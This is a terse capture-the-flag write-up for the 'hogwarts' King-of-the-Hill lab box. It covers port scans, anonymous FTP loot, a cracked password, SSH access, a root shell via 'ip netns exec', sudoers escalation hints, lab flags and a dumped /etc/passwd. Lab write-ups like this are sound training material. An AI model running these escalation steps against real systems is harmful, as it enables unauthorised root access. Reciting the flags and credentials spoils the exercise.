
THM-KOTH: hogwarts
============================

> labruhtooryboi | December 15, 2020


# 10.10.151.161 (box was reset)
# hogwarts.thm


					# reconnisance

(box was reset)
'''
Open 10.10.203.81:22
Open 10.10.203.81:7546
Open 10.10.203.81:8127
Open 10.10.203.81:8986
Open 10.10.203.81:9999
Open 10.10.203.81:42956
'''

'''
Nmap scan report for 10.10.203.81
Host is up (0.22s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  http    Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
7546/tcp  open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.26.235
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
8127/tcp  open  http    PHP cli server 5.5 or later
|_http-favicon: Unknown favicon MD5: BF5963845D95F923F11C7897E0D8D97E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Hogwart's Royal Entry
/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e:16:a1:47:0c:d6:c7:08:c9:81:c1:99:ab:83:25:16 (RSA)
|   256 6b:7b:06:db:d0:7f:cb:b4:ab:b4:31:23:12:32:d2:83 (ECDSA)
|_  256 f9:f3:e6:72:29:fd:97:e0:be:ca:f7:75:a2:77:b8:3b (ED25519)
9999/tcp  open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Tue, 15 Dec 2020 19:48:32 GMT
|     Content-Length: 0
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Tue, 15 Dec 2020 19:48:31 GMT
|_    Content-Length: 0
42956/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
|     /||\x20 \n // // || \x20 \n // // || \x20 \n // \x20 || // \n // \x20 || // \x20
|     \x20|| // \n ===========||===========
|     -------------------------------------------------------~~
|     -Antioch, Cadmus and Ignotus Peverell
|     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
|     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
|     Death took a price, but I tell you for free, 
|     gifts that I had, I gave to these 3..
|_    last sighted in hogwa
2 services unrecognized despite returning data.
'''



					# enumeration

'''
anon ftp
.I_saved_it_harry.zip
'''

'''
paris            (I_saved_it_harry.zip/boot/.pass)
neville:ebt1orcp!yx27lxaf9rfn4@v4
'''



					# exploitation

'''
ssh neville@10.10.203.81 -p 8986
'''
'''
ebt1orcp!yx27lxaf9rfn4@v4
'''



					# privelage escalation
					
'''
/usr/bin/ip
'''

'''
ip netns add foo
ip netns exec foo /bin/bash -p
'''

other methdos
'''
#includedir /etc/sudoers.d
hermoine   ALL=(root) NOPASSWD: /bin/date
draco   ALL=(root) NOPASSWD: /usr/bin/easy_install
'''



					# interesting things

>flags
'''
/root/headmaster.txt
THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}
'''

'''
/home/hermoine/special_spell.txt
THM{its_wingardium_laviosaa_Ron}
'''

'''
/home/draco/achievements.txt
THM{I_unarm3d_dumbled0re}
'''

'''
/home/harry/special_spell.txt
THM{Yeah_1_swallowed_the_sn1tch.}
'''



>users
'''
root
ubuntu
neville
harry
draco
hermoine
'''


>passwds
'''
(neville's passwd changed after box reset so it could vary)
'''

'''
'''

>files and dirs
'''
ftp 10.10.203.81 7546
.../.../.I_saved_it_harry.zip
'''

'''
/usr/bin/ip
/bin/date
/usr/bin/easy_install
'''

'''
http
/robots.txt
/interactive
/login.php
'''

>root stuff 
'''
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
holmes:x:1001:1001:,,,:/home/holmes:/bin/bash
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:113:119:ftp daemon,,,:/srv/ftp:/bin/false
neville:x:1002:1002:,,,:/home/neville:/bin/bash
hermoine:x:1003:1003:,,,:/home/hermoine:/bin/bash
draco:x:1004:1004:,,,:/home/draco:/bin/bash
harry:x:1005:1005:,,,:/home/harry:/bin/bash
ubuntu:x:1006:1006:Ubuntu:/home/ubuntu:/bin/bash
'''

'''
(passwds change every time there is a new instance of the box so shadow will likely not be relevant)
'''
